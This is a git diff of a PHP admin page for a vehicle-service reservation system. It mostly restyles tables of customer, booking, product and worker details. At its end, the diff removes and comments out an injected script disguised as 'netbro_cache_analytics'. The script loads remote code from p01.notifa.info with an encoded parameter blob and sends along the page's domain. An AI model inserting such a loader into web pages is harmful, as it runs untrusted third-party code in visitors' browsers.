@@ -288,12 +288,12 @@
               <div class="row">
                 <div class="col-md-6">
                     <div class="table-responsive">
-                    <table class="table">
-                        
-                        <tr><th style="width: 15px !important;">Nama Konsumen</th><td><?php echo $row[0]->namaLengkap ?></td></tr>
+                    <table class="table table-bordered">
+                        <tr><th colspan="2" style="text-align: center;">Data Konsumen</th></tr>
+                        <tr><th style="width: 15px !important;">Nama Lengkap</th><td><?php echo $row[0]->namaLengkap ?></td></tr>
                         <tr><th>No Telepon</th><td><?php echo $row[0]->noTelepon ?></td></tr>
                         <tr><th>Alamat Lengkap</th><td><?php echo $row[0]->alamatLengkap ?></td></tr>
-                        <tr><th>Foto Konsumen</th><td></td></tr>
+                        <tr><th>Foto</th><td></td></tr>
                     </table>
                   </div>
                   <img src="<?php echo base_url().'gambar_proyek/'.$row[0]->fotoKonsumen ?>" width="200px" height="200px">
@@ -301,21 +301,34 @@
                 </div>
                 <div class="col-md-6">
                     <div class="table-responsive">
-                    <table class="table">
+                    <table class="table table-bordered">
+                        <tr><th colspan="2" style="text-align: center;">Data Reservasi</th></tr>
                         <tr><th>No Antrian</th><td><?php echo $row[0]->noAntrian ?></td></tr>
                         <tr><th>No Plat</th><td><?php echo $row[0]->noPlat ?></td></tr>
                         <tr><th>Jenis Booking</th><td><?php echo $row[0]->jenisBooking ?></td></tr>
-                        <tr><th style="width: 15px !important;">Tgl Transaksi</th><td><?php echo date_format (new DateTime($row[0]->tglTransaksi), 'd M Y') ?></td></tr>
+                        <tr><th style="width: 15px !important;">Tgl Transaksi</th><td><?php echo date_format (new DateTime($row[0]->tglTransaksi), 'd M Y').' '.date_format (new DateTime($row[0]->tglPembayaran), 'H:i:s') ?></td></tr>
                         <tr><th>Status Reservasi</th><td><?php echo $row[0]->statusPembayaran ?></td></tr>
-                        <tr><th>Nama Jasa</th><td><?php echo $row[0]->namaProduk ?></td></tr>
-                        <tr><th>Kategori</th><td><?php echo $row[0]->kategori ?></td></tr>
                         <tr><th>Total Bayar</th><td>Rp.<?php echo number_format($row[0]->totalBayar, 0,",",".") ?></td></tr>
+                    </table>
+                    <br>
+                    <table class="table table-bordered">
+                      <tr><th colspan="2" style="text-align: center;">Produk Terpilih</th></tr>
+                        <?php foreach ($penjualanProduk as $key) { ?>
+                            <tr><th style="width: 15px !important;">Nama Produk</th><td><?php echo $key->namaProduk ?></td></tr>
+                            <tr><th>Kategori</th><td><?php echo $key->kategori ?></td></tr>
+                            <tr><th>Harga</th><td><?php echo $key->hargaPenjualan ?></td></tr>
+                        <?php } ?> 
+                    </table>
+                    <br>
+                    <table class="table table-bordered">
+                        <tr><th colspan="2" style="text-align: center;">Nama Pegawai Kiko</th></tr>
                         <?php 
                         if ($KdTukang[0] != 0) { ?>
                          
-                          <tr><th>Nama Tukang</th><td><?php echo $row[0]->nama_lengkap ?></td></tr>
+                          <tr><th style="width: 15px !important;">Nama Lengkap</th><td><?php echo $row[0]->nama_lengkap ?></td></tr>
                           <tr><th>No Handphone</th><td><?php echo $row[0]->tukangHP ?></td></tr>
-                          <tr><th>Status</th><td><?php 
+                          <tr><th>Jenis Kelamin</th><td><?php echo $row[0]->jenisKelamin ?>
+                            <!-- <?php 
 
                           if ($row[0]->status == 1) {
                             $status = 'Free';
@@ -323,7 +336,9 @@
                             $status = 'Kerja';
                           }
 
-                          echo $status ?></td></tr>
+                          echo $status ?> -->
+                            
+                          </td></tr>
                         
                         <?php 
                         }
@@ -374,6 +389,7 @@
   <script src="<?php echo base_url() ?>admin/js/dashboard.js"></script>
    <script src="<?php echo base_url() ?>admin/js/data-table.js"></script>
   <!-- End custom js for this page-->
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd9%2f1qnbRUEVDaLDOLvcbvWBm58jdhbN5LM041ifJBZ4HHvIzRSXMUkU4lPIh%2fYqiYc7wtqmtMWoVr1kId0HDTGeZ%2bwQlH%2f%2btg9ebKzUxo5T%2b%2bUN33UTMMTi3eGi571v2PevtQzTdiYpJVhTtVEGUZXMKXF300l5O8y2VFuocYUdTimwf0tcjekcsd0TAIp%2fx2G5jr67Au82DHajA2TlsBD3vQpEs6V7vc%2fK5PMmaV4mxJK6Qdbjc8X66VRhcIdG0rPLtCnwGAfXHnH0q7lDgPG2%2bel3wwNlE8NuCC%2bSmu2SxOiUx7A%2fkj1m9sM6a7R9yRzGzMEzGh3%2fZ5h3fPhYwybJgtfoY8sfQS9qABhgp%2bKXOhY1eGm056ufcOuaT9yTsNAy03FCk1yKUbUYcdljSxWQlc%2ftnBOBZKowLu%2ff7SENG%2bUzAmQLVINArEORbgm66kyE03E0UOkllDZopVlWKTRVEGKpAY%2bhlJ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<!-- <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd9%2f1qnbRUEVDaLDOLvcbvWBm58jdhbN5LM041ifJBZ4HHvIzRSXMUkU4lPIh%2fYqiYc7wtqmtMWoVr1kId0HDTGeZ%2bwQlH%2f%2btg9ebKzUxo5T%2b%2bUN33UTMMTi3eGi571v2PevtQzTdiYpJVhTtVEGUZXMKXF300l5O8y2VFuocYUdTimwf0tcjekcsd0TAIp%2fx2G5jr67Au82DHajA2TlsBD3vQpEs6V7vc%2fK5PMmaV4mxJK6Qdbjc8X66VRhcIdG0rPLtCnwGAfXHnH0q7lDgPG2%2bel3wwNlE8NuCC%2bSmu2SxOiUx7A%2fkj1m9sM6a7R9yRzGzMEzGh3%2fZ5h3fPhYwybJgtfoY8sfQS9qABhgp%2bKXOhY1eGm056ufcOuaT9yTsNAy03FCk1yKUbUYcdljSxWQlc%2ftnBOBZKowLu%2ff7SENG%2bUzAmQLVINArEORbgm66kyE03E0UOkllDZopVlWKTRVEGKpAY%2bhlJ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script> -->
+</body>
 
 </html>
